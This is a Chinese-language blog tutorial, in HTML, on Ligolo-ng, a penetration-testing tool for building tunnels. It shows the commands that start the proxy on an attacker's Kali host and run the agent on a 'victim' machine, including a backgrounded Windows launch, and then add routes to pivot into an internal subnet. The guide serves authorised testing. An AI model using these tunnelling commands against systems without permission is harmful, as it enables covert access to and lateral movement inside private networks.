@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - 隧道代理工具 - Ligolo-ng</title>
+        <meta name="description" content="介绍 Ligolo-ng是一款简单、轻量级且快速的工具，它允许渗透测试人员使用tun 接口从反向 TCP/TLS 连接建立隧道（无需 SOCKS） 项目地址：https://github.com/nicocha30/ligolo-ng 官网文档：https://docs.ligolo.ng/ 优势 使用简单 隧道接口（…">
+    <link rel="canonical" href="https://the0n3.top/posts/proxy-Ligolo-ng/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="隧道代理工具 - Ligolo-ng">
+    <meta property="og:description" content="介绍 Ligolo-ng是一款简单、轻量级且快速的工具，它允许渗透测试人员使用tun 接口从反向 TCP/TLS 连接建立隧道（无需 SOCKS） 项目地址：https://github.com/nicocha30/ligolo-ng 官网文档：https://docs.ligolo.ng/ 优势 使用简单 隧道接口（…">
+    <meta property="og:url" content="https://the0n3.top/posts/proxy-Ligolo-ng/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/ligolo-ng/logo.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="隧道代理工具 - Ligolo-ng">
+    <meta name="twitter:description" content="介绍 Ligolo-ng是一款简单、轻量级且快速的工具，它允许渗透测试人员使用tun 接口从反向 TCP/TLS 连接建立隧道（无需 SOCKS） 项目地址：https://github.com/nicocha30/ligolo-ng 官网文档：https://docs.ligolo.ng/ 优势 使用简单 隧道接口（…">
+        <meta name="twitter:image" content="https://the0n3.top/images/ligolo-ng/logo.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>隧道代理工具 - Ligolo-ng</h1>
+    <p>
+        <span class="meta">发布于: 2026-07-16 19:23</span>
+    </p>
+    <div class="post-body">
+        <h2>介绍</h2>
+<p><img src="/images/ligolo-ng/logo.png" alt="" decoding="async" width="1050" height="200"></p>
+<p>Ligolo-ng是一款简单、轻量级且快速的工具，它允许渗透测试人员使用tun 接口从反向 TCP/TLS 连接建立隧道（无需 SOCKS）</p>
+<p>项目地址：<a href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a></p>
+<p>官网文档：<a href="https://docs.ligolo.ng/">https://docs.ligolo.ng/</a></p>
+<h2>优势</h2>
+<ul>
+<li>使用简单</li>
+<li>隧道接口（不再使用 SOCKS！）</li>
+<li>支持多种平台（Linux、Windows、macOS）</li>
+<li>高性能</li>
+<li>不需要高权限</li>
+<li>使用 Let's Encrypt 自动配置证书</li>
+</ul>
+<p>攻击机（kali）需要有权限创建tun网卡接口，对于靶机来说，ligolo-ng不需要高权限即可运行</p>
+<h2>安装</h2>
+<h3>预编译二进制文件</h3>
+<p>Github Release<a href="https://github.com/nicocha30/ligolo-ng/releases">https://github.com/nicocha30/ligolo-ng/releases</a>获取最新预编译版本二进制文件（Windows/Linux/macOS/BSD）</p>
+<h3>kali存储库</h3>
+<p>Ligolo-ng 现在已默认包含在 Kali Linux 中，使用以下命令安装它：</p>
+<pre><code class="language-bash">apt install ligolo-ng</code></pre>
+<h2>快速入门</h2>
+<p>帮助信息</p>
+<pre><code class="language-bash"># -laddr &lt;addr&gt; 监听地址，默认 0.0.0.0:11601
+# -selfcert 生成自签名证书
+# -certfile &lt;cert&gt; 指定证书文件
+# -keyfile &lt;key&gt; 指定密钥文件
+# -autocert 使用 Let's Encrypt 自动配置证书
+# -config &lt;file&gt; 指定配置文件
+./proxy [-laddr &lt;addr&gt;]  [-selfcert] [-certfile &lt;cert&gt; -keyfile &lt;key&gt;] [-autocert] [-config &lt;file&gt;] [-v] [-daemon]</code></pre>
+<p>攻击机（kali）启动 Ligolo-ng 代理服务器（默认端口 11601）：</p>
+<pre><code class="language-bash"># 攻击机
+./proxy -selfcert</code></pre>
+<p>在目标（受害者）计算机上启动代理（无需任何权限）：</p>
+<pre><code class="language-plaintext"># linux
+./agent -connect KALI_IP:11601 -ignore-cert
+# windows
+agent.exe -connect KALI_IP:11601 -ignore-cert
+# 放后台运行
+start /B "" cmd /c "agent.exe -connect KALI_IP:11601 -ignore-cert"</code></pre>
+<p>目标机器启动代理后，攻击机会提示收到一个会话</p>
+<pre><code class="language-plaintext">INFO[0102] Agent joined. name=nchatelain@nworkstation remote="XX.XX.XX.XX:38000"</code></pre>
+<pre><code class="language-bash"># 显示当前会话列表
+session
+# 选择 agent
+session 1
+# 提示选择创建接口及要添加的路由，是否开启转发流量等（推荐）
+autoroute
+# 手动添加路由
+route_add 172.16.0.0/24 ligolo
+# 启动隧道（开始转发流量）
+start</code></pre>
+<h2>TLS选项</h2>
+<ul>
+<li><code>-ignore-cert</code>：Agent 端跳过 TLS 证书校验（配合 <code>-selfcert</code> 使用）</li>
+<li><code>-autocert</code>：使用 Let's Encrypt 自动签发证书（需公网 IP、80/443 端口、合法域名）</li>
+<li><code>-certfile</code> / <code>-keyfile</code>：使用自定义证书和私钥</li>
+<li><code>-selfcert</code>：自动生成自签名证书（Proxy 端）</li>
+</ul>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>隧道代理</span>
+                            </span>
+                    </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
